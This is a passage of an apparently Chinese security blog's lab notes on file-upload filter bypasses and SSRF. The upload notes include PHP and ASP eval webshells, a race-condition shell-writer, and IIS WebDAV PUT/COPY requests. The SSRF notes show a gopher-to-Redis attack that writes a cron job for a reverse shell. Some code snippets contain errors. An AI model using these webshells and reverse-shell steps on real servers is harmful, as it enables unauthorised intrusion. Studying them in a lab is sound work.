class="line">JPEG图形.jpeg .jpg image&#x2F;jpeg</span><br><span class="line">au声音文件.au  audio&#x2F;basic</span><br><span class="line">MIDI音乐文件mid .midi  audio&#x2F;midi,audio&#x2F;x-midi</span><br><span class="line">RealAudio音乐文件.ra  .ram  audio&#x2F;x-pn-realaudio</span><br><span class="line">MPEG文件.mpg .mpeg  video&#x2F;mpeg</span><br><span class="line">AVI文件 .avi video&#x2F;x-msvideo</span><br><span class="line">用到时浏览器查询即可</span><br><span class="line"></span><br><span class="line">2.Burpsuite绕过MIME-Type验证</span><br><span class="line">上传1.php</span><br><span class="line">利用Burpsuite截断HTTP请求，在Repeter(或者中间的content-Type)重放修改MIME-Type类型绕过验证。</span><br><span class="line">修改为符合要求的MIME-Type：image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">3.菜刀连接</span><br><span class="line">上传webshell，菜刀连接</span><br><span class="line">一句话木马：&lt;?php @eval($_POST[&#39;cmd&#39;];?)&gt;</span><br><span class="line">技巧：可通过右键查看上传图片属性，获取上传webshell的地址，进行连接。</span><br></pre></td></tr></table></figure><h2 id="绕过黑名单限制的文件上传"><a href="#绕过黑名单限制的文件上传" class="headerlink" title="绕过黑名单限制的文件上传"></a>绕过黑名单限制的文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.基于文件后缀名的验证</span><br><span class="line">分类：</span><br><span class="line">基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功</span><br><span class="line">基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</span><br><span class="line"></span><br><span class="line">2.Burpsuite绕过验证</span><br><span class="line">先以.jpg等符合的后缀名上传，再使用Burpsuite截断HTTP请求，再修改文件后缀名，或利用intruder模块进行枚举后缀名，寻找黑名单没有过滤的后缀名。</span><br><span class="line">PhP</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">phtml</span><br><span class="line"></span><br><span class="line">3.上传webshell，菜刀连接</span><br></pre></td></tr></table></figure><h2 id="htaccess绕过进行文件上传"><a href="#htaccess绕过进行文件上传" class="headerlink" title=".htaccess绕过进行文件上传"></a>.htaccess绕过进行文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1..htaccess文件</span><br><span class="line">htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置。</span><br><span class="line">通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line">其中.htaccess文件内容：</span><br><span class="line">SetHander application&#x2F;x-httpd-php</span><br><span class="line">设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则会报错。</span><br><span class="line"></span><br><span class="line">当在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来设置使用php解析任意文件。文件内容：SetHander application&#x2F;x-httpd-php</span><br><span class="line"></span><br><span class="line">2.配置文件http.conf</span><br><span class="line">在Apache中如果需要启动.htaccess，必须在http.conf中设置AllowOverride</span><br><span class="line"></span><br><span class="line">3.制作图片马phpinfo探针并上传</span><br><span class="line">使用文本编辑工具写入phpinfo探针：</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">保存为1.jpg进行上传即可</span><br></pre></td></tr></table></figure><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过原理</span><br><span class="line">windows系统下，对于文件名中的大小写不敏感。例如test.php和test.PhP是一样的。</span><br><span class="line">Linux系统下，对于文件名中的大小写敏感。例如test.php和test.PhP是不一样的。</span><br><span class="line"></span><br><span class="line">2.修改后缀名大小写绕过</span><br><span class="line">直接修改后缀名大小写混合的，进行上传。</span><br><span class="line"></span><br><span class="line">3.WeBaCoo上传webshell</span><br><span class="line">使用WeBaCoo生成webshell：webacoo -g -o a.php</span><br></pre></td></tr></table></figure><h2 id="空格绕过黑名单"><a href="#空格绕过黑名单" class="headerlink" title="空格绕过黑名单"></a>空格绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.空格绕过</span><br><span class="line">window系统下，对于文件中空格会被当作空处理，程序中的检测代码不能自动删除空格，从而绕过黑名单。</span><br><span class="line"></span><br><span class="line">2.绕过验证</span><br><span class="line">使用Burpsuite工具截断HTTP请求，对上传的文件名后加空格。</span><br></pre></td></tr></table></figure><h2 id="号绕过黑名单"><a href="#号绕过黑名单" class="headerlink" title=".号绕过黑名单"></a>.号绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1..号绕过</span><br><span class="line">windows系统下，文件后缀名最后一个.会被自动去除。</span><br><span class="line"></span><br><span class="line">2.绕过黑名单验证</span><br><span class="line">使用Burpsuite工具截断HTTP请求，上传文件加.绕过上传。</span><br><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure><h2 id="特殊符号绕过黑名单"><a href="#特殊符号绕过黑名单" class="headerlink" title="特殊符号绕过黑名单"></a>特殊符号绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.特殊符号绕过原理：</span><br><span class="line">windows系统下，如果上传的文件名中test.php::$DATA会在服务器中生成test.php文件，内容和所上传文件内容相同，并被解析。</span><br><span class="line"></span><br><span class="line">2.直接上传1.php::$DATA</span><br><span class="line">在Linux下修改文件名为1.php::$DATA进行上传</span><br></pre></td></tr></table></figure><h2 id="路径拼接绕过黑名单"><a href="#路径拼接绕过黑名单" class="headerlink" title="路径拼接绕过黑名单"></a>路径拼接绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.路径拼接绕过原理</span><br><span class="line">服务器没有对用户上传的文件进行重命名的情况下，用户可以自定义文件名，并上传新建，就会造成绕过。</span><br><span class="line"></span><br><span class="line">2.绕过黑名单验证</span><br><span class="line">在Linux下修改文件名，上传1.php..文件</span><br></pre></td></tr></table></figure><h2 id="双写绕过黑名单"><a href="#双写绕过黑名单" class="headerlink" title="双写绕过黑名单"></a>双写绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.双写绕过</span><br><span class="line">代码编写过程中，只对黑名单中的内容进行空替换,因为只替换一次造成双写绕过。</span><br><span class="line">phphpp</span><br></pre></td></tr></table></figure><h2 id="00截断绕过白名单"><a href="#00截断绕过白名单" class="headerlink" title="%00截断绕过白名单"></a>%00截断绕过白名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.%00截断原理</span><br><span class="line">0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符。系统在对文件名读取时，如果遇到0x00时，就会认为读取结束。</span><br><span class="line"></span><br><span class="line">在PHP5.3版本之后的已经修复了00截断。并且00截断受限于GPC、addslasher函数。</span><br><span class="line"></span><br><span class="line">2.GET型%00截断</span><br><span class="line">GET型提交的内容会被自动进行URL编码，前提是GPC是关闭的。</span><br><span class="line">在拼接路径后面1.php%00: ..&#x2F;upload&#x2F;1.php%00</span><br><span class="line"></span><br><span class="line">3.POST型%00截断</span><br><span class="line">在POST请求中，%00不会被自动解码，在burpsuite中选择HEX编码形式进行修改00</span><br></pre></td></tr></table></figure><h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.图片马</span><br><span class="line">在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合规范，通过查看文件二进制格式的前几个字节，从而判断文件类型是否正确。</span><br><span class="line">在前面添加GIF98A即可。</span><br><span class="line"></span><br><span class="line">2.上传</span><br><span class="line">在上传过程中可能有content-Type验证，修改为image&#x2F;gif或image&#x2F;jpg,使其符合当前文件类型的MIME-Type.</span><br><span class="line"></span><br><span class="line">3.文件包含漏洞</span><br><span class="line">在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当作PHP代码执行，无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。</span><br><span class="line"></span><br><span class="line">4.结合文件包含输出phpinfo</span><br><span class="line">利用存在文件包含的PHP页面，包含上传的图片webshell，从而触发webshell，输出相应的phpinfo。</span><br></pre></td></tr></table></figure><h2 id="条件竞争上传"><a href="#条件竞争上传" class="headerlink" title="条件竞争上传"></a>条件竞争上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.文件上传过程</span><br><span class="line">服务器获取文件---&gt;保存上传临时文件---&gt;重命名移动临时文件</span><br><span class="line"></span><br><span class="line">2.条件竞争原理</span><br><span class="line">网站逻辑：</span><br><span class="line">(1)网站允许上传任意文件，然后检查上传文件是否包含webshell，如果包含删除该文件。</span><br><span class="line">(2)网站允许上传任意文件，但如果不是指定类型，使用unlink删除文件。</span><br><span class="line">在删除之前访问上传的php文件，从而执行上传文件中的php代码。</span><br><span class="line"></span><br><span class="line">3.条件竞争上传利用</span><br><span class="line">上传前不断访问代码文件，然后上传。</span><br><span class="line">Python发送http请求：</span><br><span class="line">import requests</span><br><span class="line">while true：</span><br><span class="line">   request.get(&quot;路径&quot;)</span><br><span class="line"></span><br><span class="line">写入webshell：</span><br><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])？&gt;&#39;)</span><br></pre></td></tr></table></figure><h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1.IIS6.0解析漏洞</span><br><span class="line">（1）当建立*.asa、 *.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件解析。</span><br><span class="line">（2）文件*.asp;1.jpg 会被IIS6.0当作asp文件解析。</span><br><span class="line"></span><br><span class="line">2.IIS6.0 PUT上传原理</span><br><span class="line">IIS6.0集成了 WebDAV功能模块，基于HTTP1.1协议的通信协议使得HTTP支持PUT、MOVE、COPY、DELETE方法。</span><br><span class="line"></span><br><span class="line">3.IIS6.0 PUT上传探测</span><br><span class="line">(1)探测是否存在：</span><br><span class="line">OPTIONS &#x2F;HTTP 1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line"></span><br><span class="line">(2)上传txt文本文件：</span><br><span class="line">PUT &#x2F;a.txt HTTP1.1</span><br><span class="line">Host：www.xxx.com</span><br><span class="line">Content-Length:30</span><br><span class="line">&lt;%eval request(&quot;chopper&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">(3)通过MOVE或Copy重命名：</span><br><span class="line">COPY &#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line">Destinstion:</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp;a.jpg</span><br><span class="line"></span><br><span class="line">(4)删除原txt</span><br><span class="line">DELETE &#x2F;a.txt HTTP1.1</span><br><span class="line">Host:www.xxx.com</span><br><span class="line"></span><br><span class="line">可以使用工具nikto进行探测：</span><br><span class="line">nikto -h IP地址</span><br><span class="line"></span><br><span class="line">4.IIS6.0 PUT上传利用</span><br><span class="line">利用Burpsuite进行IIS PUT漏洞利用</span><br><span class="line"></span><br><span class="line">5.IIS6.0解析文件类型</span><br><span class="line">IIS6.0默认可执行的文件除了asp还包括：</span><br><span class="line">&#x2F;.asa</span><br><span class="line">&#x2F;.cer</span><br><span class="line">&#x2F;.cdx</span><br><span class="line"></span><br><span class="line">6.漏洞修复</span><br><span class="line">阻止上传xxx.asp;.jpg类型的文件名；</span><br><span class="line">做好权限设置。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="http://yoursite.com/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/08/01/SSRF漏洞/</id>
    <published>2020-08-01T11:05:48.000Z</published>
    <updated>2020-08-01T15:18:22.476Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h4 id="什么是SSRF漏洞"><a href="#什么是SSRF漏洞" class="headerlink" title="什么是SSRF漏洞"></a>什么是SSRF漏洞</h4><p>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801191249593.png" alt="image-20200801191249593"></p><p>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</p><h4 id="SSRF形成原因"><a href="#SSRF形成原因" class="headerlink" title="SSRF形成原因"></a>SSRF形成原因</h4><p>大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。</p><h4 id="SSRF和CSRF的区别"><a href="#SSRF和CSRF的区别" class="headerlink" title="SSRF和CSRF的区别"></a>SSRF和CSRF的区别</h4><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器。</p><p>SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</p><h4 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h4><p>回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器获取攻击者要求的URL后，把响应发送回攻击者。</span><br></pre></td></tr></table></figure><p>不回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。</span><br></pre></td></tr></table></figure><h4 id="SSRF可以实现的攻击"><a href="#SSRF可以实现的攻击" class="headerlink" title="SSRF可以实现的攻击"></a>SSRF可以实现的攻击</h4><p>1.获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透。</p><p>2.攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）。</p><p>3.利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。</p><h4 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h4><p>结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。</p><h2 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h2><h4 id="测试定时任务写shell"><a href="#测试定时任务写shell" class="headerlink" title="测试定时任务写shell"></a>测试定时任务写shell</h4><p>CentOS机器开启Redis服务，写定时任务到CentOS机器中。</p><p>1.Redis服务安装时默认绑定IP为127.0.0.1，此处不需要设置，查看Redis配置文件redis.conf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find  &#x2F;  -name  redis.conf</span><br><span class="line">vi  &#x2F;root&#x2F;redis-5.0.4&#x2F;redis.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801192819048.png" alt="image-20200801192819048"></p><p>2.CentOS机器开启Redis服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">.&#x2F;redis-server  &#x2F;root&#x2F;redis-5.0.4&#x2F;redis.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801192953504.png" alt="image-20200801192953504"></p><p>3.查看kaili攻击机的redis版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;redis&#x2F;</span><br><span class="line">.&#x2F;redis-server  –v</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193353596.png" alt="image-20200801193353596"></p><p>4.启动redis服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-server</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193447799.png" alt="image-20200801193447799"></p><p>5.另开启一个终端，测试启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;redis&#x2F;</span><br><span class="line">.&#x2F;redis-cli  ping</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193605433.png" alt="image-20200801193605433"></p><p>启动成功</p><p>6.在kali攻击机写一个redis反弹shell的bash脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi  shell.sh</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801193743233.png" alt="image-20200801193743233"></p><p>保存退出</p><p>在Redis的第0个数据库中添加key为1，名为root的定时任务，value字段最后会多一个n是因为echo重定向最后会自带一个换行符，位置为CentOS机器的/var/spool/cron/，10.1.1.200为获取反弹shell的本地IP地址，666为反弹shell的监听端口，可随意设置。</p><h4 id="gopher协议攻击Redis"><a href="#gopher协议攻击Redis" class="headerlink" title="gopher协议攻击Redis"></a>gopher协议攻击Redis</h4><p>通过gopher协议攻击Redis，如果内网中的Redis存在未授权访问漏洞，当Redis服务以root权限运行时，利用gopher协议攻击内网中的Redis，通过写入定时任务可以实现反弹shell。</p><p>1.Kali攻击机另外开启一个终端，使用socat进行端口转发，获取Redis攻击的TCP数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat  -v tcp-listen:2333,fork  tcp-connect:127.0.0.1:6379</span><br></pre></td></tr></table></figure><p>将本地的2333端口转发到Redis服务器的6379端口，访问本地的2333端口其实是访问Redis服务器的6379端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行脚本：bash  shell.sh  127.0.0.1  2333</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801200548438.png" alt="image-20200801200548438"></p><p>捕获到的数据</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801201002550.png" alt="image-20200801201002550"></p><p>3.利用脚本将数据转换成适配于gopher协议的URL，转换规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果第一个字符是 &gt; 或者 &lt; ，则丢弃该行字符串，表示请求和返回的时间；</span><br><span class="line"></span><br><span class="line">如果前三个字符是 +OK，则丢弃该行字符串，表示返回的字符串；</span><br><span class="line"></span><br><span class="line">将\r字符替换成 %0d%0a；</span><br><span class="line"></span><br><span class="line">将空白行替换成 %0a。</span><br></pre></td></tr></table></figure><p>转化脚本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import sys</span><br><span class="line">exp&#x3D;&#39; &#39;</span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">     for line in f.readlines():</span><br><span class="line">        if line[0] in &#39;&gt;&lt;+&#39;:</span><br><span class="line">           continue</span><br><span class="line">        elif line[-3:-1]&#x3D;&#x3D; r&#39;\r&#39;:</span><br><span class="line">        &#x2F;&#x2F;如果该行只有\r,将\r替换成%0a%0d%0a</span><br><span class="line">           if len(line)&#x3D;&#x3D;3:</span><br><span class="line">              exp&#x3D;exp+&#39;%0a%0d%0a&#39;</span><br><span class="line">           else:</span><br><span class="line">              line&#x3D;line.replace(r&#39;\r&#39;,&#39;%0d%0a&#39;)</span><br><span class="line">        &#x2F;&#x2F;去掉最后的换行符</span><br><span class="line">              line&#x3D;line.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">              exp&#x3D;exp+line</span><br><span class="line">        &#x2F;&#x2F;判断是否为空行，空行替换为%0a</span><br><span class="line">        elif line&#x3D;&#x3D; &#39;\x0a&#39;:</span><br><span class="line">            exp&#x3D; exp+&#39;%0a&#39;</span><br><span class="line">        else:</span><br><span class="line">            line&#x3D;line.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">            exp&#x3D;exp+line</span><br><span class="line">print exp</span><br></pre></td></tr></table></figure><p>4.将socat获取的数据保存为socat.log文件，然后执行脚本进行数据转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi  socat.log</span><br></pre></td></tr></table></figure><p>将socat捕获的数据粘贴到socat.log中</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211517869.png" alt="image-20200801211517869"></p><p>保存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  tran2gopher.py  socat.log</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211646528.png" alt="image-20200801211646528"></p><p>nc开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  -lvvp  666</span><br></pre></td></tr></table></figure><p>5.攻击CentOS机器的Redis服务：</p><p>输入gopher://127.0.0.1:6379/_+数据转换的内容：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211846265.png" alt="image-20200801211846265"></p><p>监听结果：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801211938351.png" alt="image-20200801211938351"></p><p> 成功获取反弹shell。</p><h2 id="structs2-S2-32"><a href="#structs2-S2-32" class="headerlink" title="structs2 S2-32"></a>structs2 S2-32</h2><h4 id="structs2简介"><a href="#structs2简介" class="headerlink" title="structs2简介"></a>structs2简介</h4><p>Apache Struts 2是世界上最流行的Java Web服务器框架之一。Struts 2是Struts的下一代产品，是在Struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。</p><p>安恒信息安全研究员在Struts 2上发现了一个严重的远程代码执行漏洞（CVE-2016-3081,S02-32），该漏洞危险级别为高危。</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801213232212.png" alt="image-20200801213232212"></p><h4 id="判断structs2存在"><a href="#判断structs2存在" class="headerlink" title="判断structs2存在"></a>判断structs2存在</h4><p>Struts2需要在Tomcat中运行，看8080端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;</span><br></pre></td></tr></table></figure><p>在回显中会有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">structs2 showcase for Apache Structs Project</span><br></pre></td></tr></table></figure><p>说明Struts2服务存在</p><h4 id="判断Struts–s2-32漏洞"><a href="#判断Struts–s2-32漏洞" class="headerlink" title="判断Struts–s2-32漏洞"></a>判断Struts–s2-32漏洞</h4><p>Struts –s2-32漏洞POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 